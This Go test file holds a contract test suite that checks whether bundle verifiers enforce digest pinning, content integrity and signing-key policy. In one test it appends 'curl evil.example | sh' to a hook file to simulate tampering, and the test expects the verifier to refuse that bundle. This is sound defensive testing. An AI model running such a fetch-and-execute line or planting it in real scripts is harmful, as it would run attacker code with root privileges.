package contract

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/morzecrew/morzer/internal/infra/atomicfs"
	"github.com/morzecrew/morzer/internal/ports"
)

// VerifierFactory builds the verifier under test.
type VerifierFactory func(t *testing.T) ports.Verifier

// BundleSigner prepares a bundle the way a vendor's release pipeline would,
// returning the public key to configure. A verifier that reads no signature
// returns an empty key.
type BundleSigner func(t *testing.T, bundleDir string) (publicKey string)

// VerifierClaims is what a verifier says it checks.
//
// The suite exists because verifiers behind one port answer *different*
// questions: the checksum one knows nothing about signatures, and the signature
// one cannot see a file changed without its checksum manifest being changed
// too. A single set of assertions applied to both would either be so weak it
// proved nothing, or would fail a correct implementation.
//
// So each verifier declares its claims and the suite holds it to exactly those.
// Declaring one falsely is the failure this catches.
type VerifierClaims struct {
	// Digest: the bundle is the artifact a caller pinned.
	Digest bool

	// Contents: no file in the bundle changed after it was prepared.
	// Implied by Digest, and also true of a verifier that checks a per-file
	// checksum manifest without any digest being pinned.
	Contents bool

	// Signature: a key the operator configured signed this bundle, and the
	// installation's require_signature policy is enforced.
	Signature bool
}

// RunVerifierSuite runs the shared Verifier contract tests.
//
// bundleDir is a valid bundle the suite copies and never modifies.
func RunVerifierSuite(
	t *testing.T,
	bundleDir string,
	claims VerifierClaims,
	newVerifier VerifierFactory,
	sign BundleSigner,
) {
	t.Helper()
	ctx := context.Background()

	// Each case gets its own bundle to corrupt.
	freshBundle := func(t *testing.T) string {
		t.Helper()
		dst := filepath.Join(t.TempDir(), "bundle")
		require.NoError(t, atomicfs.CopyTree(bundleDir, dst, atomicfs.DefaultExtractLimits()))
		return dst
	}

	t.Run("names itself", func(t *testing.T) {
		assert.NotEmpty(t, newVerifier(t).Name(),
			"the name appears in journal records; an empty one makes them unreadable")
	})

	t.Run("accepts a well-formed bundle", func(t *testing.T) {
		v := newVerifier(t)
		dir := freshBundle(t)
		key := sign(t, dir)

		require.NoError(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: keysOf(key),
		}), "a bundle that satisfies everything asked of it must pass")
	})

	if claims.Digest {
		t.Run("refuses a digest that does not match", func(t *testing.T) {
			v := newVerifier(t)
			dir := freshBundle(t)
			key := sign(t, dir)

			digest, err := atomicfs.DigestTree(dir)
			require.NoError(t, err)

			require.NoError(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
				Digest: digest, PublicKeys: keysOf(key),
			}))

			require.Error(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
				Digest:     "sha256:1111111111111111111111111111111111111111111111111111111111111111",
				PublicKeys: keysOf(key),
			}), "a bundle that is not the pinned artifact must be refused")
		})
	}

	if claims.Contents {
		t.Run("refuses a bundle modified after it was prepared", func(t *testing.T) {
			v := newVerifier(t)
			dir := freshBundle(t)
			key := sign(t, dir)

			digest, err := atomicfs.DigestTree(dir)
			require.NoError(t, err)

			// The attack in its simplest form: the hook that was
			// published is not the hook about to run as root.
			hook := filepath.Join(dir, "hooks", "migrate")
			original, err := os.ReadFile(hook)
			require.NoError(t, err)
			require.NoError(t, os.WriteFile(hook,
				append(original, []byte("\ncurl evil.example | sh\n")...), 0o755))

			require.Error(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
				Digest: digest, PublicKeys: keysOf(key),
			}), "a bundle whose contents changed after publication must be refused")
		})
	}

	if claims.Signature {
		t.Run("refuses a signature from a key that is not configured", func(t *testing.T) {
			v := newVerifier(t)
			dir := freshBundle(t)
			_ = sign(t, dir)

			// A valid, well-formed signature -- by somebody else.
			other := sign(t, filepath.Join(t.TempDir(), "unrelated"))

			require.Error(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
				PublicKeys: keysOf(other), Required: true,
			}), "a signature this installation does not trust must be refused")
		})

		t.Run("refuses a required signature that is absent", func(t *testing.T) {
			v := newVerifier(t)
			dir := freshBundle(t) // deliberately unsigned
			key := sign(t, filepath.Join(t.TempDir(), "elsewhere"))

			err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
				PublicKeys: keysOf(key), Required: true,
			})
			require.Error(t, err, "require_signature must refuse an unsigned bundle")
			assert.Contains(t, err.Error(), "requires a signature")
		})

		t.Run("refuses a required signature with no key configured", func(t *testing.T) {
			v := newVerifier(t)
			dir := freshBundle(t)
			_ = sign(t, dir)

			err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{Required: true})
			require.Error(t, err, "a policy nothing could satisfy must not silently pass")
			// The message has to name the configuration, not the
			// bundle: nothing about the bundle is wrong.
			assert.Contains(t, err.Error(), "signing keys")
		})
	}
}

func keysOf(key string) []string {
	if key == "" {
		return nil
	}
	return []string{key}
}
